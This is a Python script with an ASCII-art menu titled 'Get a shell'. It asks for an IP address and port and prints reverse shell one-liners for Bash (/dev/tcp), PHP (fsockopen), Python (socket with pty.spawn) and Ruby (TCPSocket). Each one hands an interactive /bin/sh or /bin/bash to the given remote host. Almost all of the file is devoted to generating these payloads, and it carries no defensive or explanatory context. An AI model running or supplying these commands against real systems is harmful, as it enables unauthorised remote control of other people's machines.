from time import sleep
import sys
import os

#color
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"
#end
os.system(['clear', 'cls'][os.name == 'nt'])
def tittle():
    print(red + """
╔═╗┌─┐┌┬┐  ┌─┐  ┌─┐┬ ┬┌─┐┬  ┬  
║ ╦├┤  │   ├─┤  └─┐├─┤├┤ │  │  
╚═╝└─┘ ┴   ┴ ┴  └─┘┴ ┴└─┘┴─┘┴─┘                                                
    """)

def main_menu():
    print(red  + """
                            _______________                               
                        ,==='.,            `-._                           
                            `.`---.__         `-._                       
Chosse your shell type         :.     `--.         `.                     
  ⤷ 01(Bash)                    \.        `.         `.                   
  ⤷ 02(PHP)             (,,(,    \.         `.   ____,-`.,    if you want to leave, type   
  ⤷ 03(Python)       (,'     `/   \.   ,--.___`.'                  ⤷ 666       
  ⤷ 04(Ruby)        ,'  ,--.  `,   \.;'         `                         
                   `{D, {    \  :    \;                                    
                     V,,'    /  /    //                                    
                     j;;    /  ,' ,-//.    ,---.      ,                    
                     \;'   /  ,' /  _  \  /  _  \   ,'/                    
                           \   `'  / \  `'  / \  `.' /                     
                            `.___,'   `.__,'   `.__,'  get a shell
    
    """)
    question = input(cyan + """Enter an option
    ⤷ """)
    if question == "666":
        print(blink + "Thank you for using the script!")
        sleep(3)
        os.system(['clear', 'cls'][os.name == 'nt'])
        exit()
    elif question == "1":
         os.system(['clear', 'cls'][os.name == 'nt'])
         bash()
    elif question == "2":
         os.system(['clear', 'cls'][os.name == 'nt'])
         php()
    elif question == "3":
         os.system(['clear', 'cls'][os.name == 'nt'])
         python()
    elif question == "4":
         os.system(['clear', 'cls'][os.name == 'nt'])
         ruby()

# shells aqui >,

def bash():
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    ip = input(green  + "Enter your IP ►  ")
    print("")
    port = input(green  + "Enter the port ►  ")
    print("")
    print("")
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    print("")
    print(yellow + "Making your shell... ")
    sleep(2)
    print("")
    bash = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{bash}{blue}{reset}")
    print("")
    print("")
    sleep(6)
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
    if voltar == "yes":
        sleep(1)
        os.system(['clear', 'cls'][os.name == 'nt'])
        main_menu()
    elif voltar == "no":
        print(magenta + " ⤷ Thank you for using the script! ")
        sleep(2)
        os.system(['clear', 'cls'][os.name == 'nt'])
        exit()

def php():
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    ip = input(green  + "Enter your IP ►  ")
    print("")
    port = input(green  + "Enter the port ►  ")
    print("")
    print("")
    print(yellow + "Making your shell... ")
    sleep(2)
    print("")
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    print("")
    print(yellow + "Making your shell... ")
    sleep(2)
    print("")
    php = shell = "php -r '$sock=fsockopen(\"{}\", {});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port)
    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{php}{blue}{reset}")
    print("")
    sleep(6)
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
    if voltar == "yes":
        sleep(1)
        os.system(['clear', 'cls'][os.name == 'nt'])
        main_menu()
    elif voltar == "no":
        print(magenta + " ⤷ Thank you for using the script! ")
        sleep(2)
        os.system(['clear', 'cls'][os.name == 'nt'])
        exit()

def python():
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    ip = input(green  + "Enter your IP ►  ")
    print("")
    port = input(green  + "Enter the port ►  ")
    print("")
    print("")
    print(yellow + "Making your shell... ")
    sleep(2)
    print("")
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    print("")
    print(yellow + "Making your shell... ")
    sleep(2)
    print("")
    python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\", {}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'".format(ip, port)
    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{python}{blue}{reset}")
    print("")
    sleep(6)
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
    if voltar == "yes":
        sleep(1)
        os.system(['clear', 'cls'][os.name == 'nt'])
        main_menu()
    elif voltar == "no":
        print(magenta + " ⤷ Thank you for using the script! ")
        sleep(2)
        os.system(['clear', 'cls'][os.name == 'nt'])
        exit()


def ruby():
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    ip = input(green  + "Enter your IP ►  ")
    print("")
    port = input(green  + "Enter the port ►  ")
    print("")
    print("")
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    print("")
    print("")
    print(yellow + "Making your shell... ")
    sleep(2)
    print("")
    ruby  = "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port)
    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{ruby}{blue}{reset}")
    print("")
    print("")
    sleep(6)
    os.system(['clear', 'cls'][os.name == 'nt'])
    tittle()
    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
    if voltar == "yes":
        sleep(1)
        os.system(['clear', 'cls'][os.name == 'nt'])
        main_menu()
    elif voltar == "no":
        print(magenta + " ⤷ Thank you for using the script! ")
        sleep(2)
        os.system(['clear', 'cls'][os.name == 'nt'])
        exit()


main_menu()
bash()
php()
python()
ruby()

